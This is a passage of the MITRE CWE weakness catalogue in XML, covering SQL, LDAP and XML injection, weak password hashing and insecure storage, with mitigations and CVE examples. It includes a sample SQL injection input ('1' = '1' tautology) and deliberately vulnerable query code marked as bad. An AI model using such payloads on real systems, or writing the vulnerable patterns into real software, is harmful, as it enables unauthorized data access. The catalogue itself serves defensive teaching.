                  <xhtml:div>1432' or '1' = '1</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the resulting query:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'</xhtml:div>
               </Example_Code>
               <Body_Text>Not only will this retrieve message number 1432, it will retrieve all other messages.</Body_Text>
               <Body_Text>In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection:</Body_Text>
               <Example_Code Nature="good" Language="PHP">
                  <xhtml:div>$id = intval($_COOKIE["mid"]);<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example attempts to take a last name provided by a user and enter it into a database.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>$userKey = getUserID();<xhtml:br/>$name = getUserInput();<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># ensure only letters, hyphens and apostrophe are allowed</xhtml:i>
                     <xhtml:br/>$name = whiteList($name, "^a-zA-z'-$");<xhtml:br/>$query = "INSERT INTO last_names VALUES('$userKey', '$name')";</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer applies a whitelist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens which are used as comment structures in SQL. If a user specifies -- then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the whitelist permits the apostrophe which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-0366</Reference>
               <Description>chain: SQL injection in library intended for database authentication allows SQL injection and authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0366</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2790</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2790</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2223</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2223</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6602</Reference>
               <Description>SQL injection via user name.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6602</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5817</Reference>
               <Description>SQL injection via user name or password fields.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5817</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0377</Reference>
               <Description>SQL injection in security product, using a crafted group name.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0377</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2380</Reference>
               <Description>SQL injection in authentication library.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2380</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-11508</Reference>
               <Description>SQL injection in vulnerability management and reporting tool, using a crafted password.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11508</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>SQL injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>SQL Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>SQL injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>19</Entry_ID>
               <Entry_Name>SQL Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-89</Entry_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Oracle Coding Standard for Java">
               <Entry_ID>IDS00-J</Entry_ID>
               <Entry_Name>Prevent SQL injection</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="109"/>
            <Related_Attack_Pattern CAPEC_ID="110"/>
            <Related_Attack_Pattern CAPEC_ID="470"/>
            <Related_Attack_Pattern CAPEC_ID="66"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 1: SQL Injection.&#34; Page 3"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 12, &#34;Database Input Issues&#34; Page 397"/>
            <Reference External_Reference_ID="REF-867"/>
            <Reference External_Reference_ID="REF-868"/>
            <Reference External_Reference_ID="REF-869"/>
            <Reference External_Reference_ID="REF-870"/>
            <Reference External_Reference_ID="REF-871"/>
            <Reference External_Reference_ID="REF-872"/>
            <Reference External_Reference_ID="REF-873"/>
            <Reference External_Reference_ID="REF-874"/>
            <Reference External_Reference_ID="REF-875"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;SQL Queries&#34;, Page 431"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;SQL Injection&#34;, Page 1061"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-89"/>
         </References>
         <Notes>
            <Note Type="Relationship">SQL injection can be resultant from special character mismanagement, MAID, or blacklist/whitelist problems. It can be primary to authentication errors.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="90" Name="Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Technology Name="Database Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The code below constructs an LDAP query using user input address data:</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>context = new InitialDirContext(env);<xhtml:br/>String searchFilter = "StreetAddress=" + address;<xhtml:br/>NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);</xhtml:div>
               </Example_Code>
               <Body_Text>Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-2301</Reference>
               <Description>Server does not properly escape LDAP queries, which allows remote attackers to cause a DoS and possibly conduct an LDAP injection attack.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2301</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>LDAP injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>29</Entry_ID>
               <Entry_Name>LDAP Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="136"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-879"/>
         </References>
         <Notes>
            <Note Type="Relationship">Factors: resultant to special character mismanagement, MAID, or blacklist/whitelist problems. Can be primary to authentication and verification errors.</Note>
            <Note Type="Research Gap">Under-reported. This is likely found very frequently by third party code auditors, but there are very few publicly reported examples.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="91" Name="XML Injection (aka Blind XPath Injection)" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.</Description>
         <Extended_Description>Within XML, special elements could include reserved words or characters such as "&lt;", "&gt;", """, and "&amp;", which could then be used to add new data or modify XML syntax.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>XML injection (aka Blind Xpath injection)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>23</Entry_ID>
               <Entry_Name>XML Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="484"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-882"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;XML Injection&#34;, Page 1069"/>
         </References>
         <Notes>
            <Note Type="Maintenance">The description for this entry is generally applicable to XML, but the name includes "blind XPath injection" which is more closely associated with CWE-643. Therefore this entry might need to be deprecated or converted to a general category - although injection into raw XML is not covered by CWE-643 or CWE-652.</Note>
            <Note Type="Theoretical">In vulnerability theory terms, this is a representation-specific case of a Data/Directive Boundary Error.</Note>
            <Note Type="Research Gap">Under-reported. This is likely found regularly by third party code auditors, but there are very few publicly reported examples.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="916" Name="Use of Password Hash With Insufficient Computational Effort" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.</Description>
         <Extended_Description>
            <xhtml:p>Many password storage mechanisms compute a hash and store the hash, instead of storing the original password in plaintext. In this design, authentication involves accepting an incoming password, computing its hash, and comparing it to the stored hash.</xhtml:p>
            <xhtml:p>Many hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing (such as cloud computing) and GPU, ASIC, or FPGA hardware. In such a scenario, an efficient hash algorithm helps the attacker.</xhtml:p>
            <xhtml:p>There are several properties of a hash scheme that are relevant to its strength against an offline, massively-parallel attack:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>The amount of CPU time required to compute the hash ("stretching")</xhtml:li>
                  <xhtml:li>The amount of memory required to compute the hash ("memory-hard" operations)</xhtml:li>
                  <xhtml:li>Including a random value, along with the password, as input to the hash computation ("salting")</xhtml:li>
                  <xhtml:li>Given a hash, there is no known way of determining an input (e.g., a password) that produces this hash value, other than by guessing possible inputs ("one-way" hashing)</xhtml:li>
                  <xhtml:li>Relative to the number of all possible hashes that can be generated by the scheme, there is a low likelihood of producing the same hash for multiple different inputs ("collision resistance")</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
            <xhtml:p>Note that the security requirements for the software may vary depending on the environment and the value of the passwords. Different schemes might not provide all of these properties, yet may still provide sufficient security for the environment. Conversely, a solution might be very strong in preserving one property, which still being very weak for an attack against another property, or it might not be able to significantly reduce the efficiency of a massively-parallel attack.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="327" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="327" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="327" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If an attacker can gain access to the hashes, then the lack of sufficient computational effort will make it easier to conduct brute force attacks using techniques such as rainbow tables, or specialized hardware such as GPUs, which can be much faster than general-purpose CPUs for computing hashes.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-51">
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-1526</Reference>
               <Description>Router does not use a salt with a hash, making it easier to crack passwords.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1526</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-1058</Reference>
               <Description>Router does not use a salt with a hash, making it easier to crack passwords.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4905</Reference>
               <Description>Blogging software uses a hard-coded salt when calculating a password hash.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4905</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1657</Reference>
               <Description>Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1657</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0967</Reference>
               <Description>Server uses a constant salt when encrypting passwords, simplifying brute force attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0967</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="55"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-291"/>
            <Reference External_Reference_ID="REF-292"/>
            <Reference External_Reference_ID="REF-293" Section="5.2 PBKDF2"/>
            <Reference External_Reference_ID="REF-294"/>
            <Reference External_Reference_ID="REF-295"/>
            <Reference External_Reference_ID="REF-296"/>
            <Reference External_Reference_ID="REF-297"/>
            <Reference External_Reference_ID="REF-298"/>
            <Reference External_Reference_ID="REF-636"/>
            <Reference External_Reference_ID="REF-631"/>
            <Reference External_Reference_ID="REF-632"/>
            <Reference External_Reference_ID="REF-908"/>
            <Reference External_Reference_ID="REF-909"/>
            <Reference External_Reference_ID="REF-633"/>
         </References>
         
      </Weakness>
      <Weakness ID="921" Name="Storage of Sensitive Data in a Mechanism without Access Control" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software stores sensitive information in a file system or device that does not have built-in access control.</Description>
         <Extended_Description>
            <xhtml:p>While many modern file systems or devices utilize some form of access control in order to restrict access to data, not all storage mechanisms have this capability. For example, memory cards, floppy disks, CDs, and USB devices are typically made accessible to any user within the system. This can become a problem when sensitive data is stored in these mechanisms in a multi-user environment, because anybody on the system can read or write this data.</xhtml:p>
            <xhtml:p>On Android devices, external storage is typically globally readable and writable by other applications on the device. External storage may also be easily accessible through the mobile device's USB connection or physically accessible through the device's memory card port.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="922" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="922" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>Attackers can read sensitive information by accessing the unrestricted storage mechanism.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>Attackers can modify or delete sensitive information by accessing the unrestricted storage mechanism.</Note>
            </Consequence>
         </Common_Consequences>
         <References>
            <Reference External_Reference_ID="REF-921"/>
         </References>
         
      </Weakness>
      <Weakness ID="922" Name="Insecure Storage of Sensitive Information" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software stores sensitive information without properly limiting read or write access by unauthorized actors.</Description>
         <Extended_Description>If read access is not properly restricted, then attackers can steal the sensitive information. If write access is not properly restricted, then attackers can modify and possibly delete the data, causing incorrect results and possibly a denial of service.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
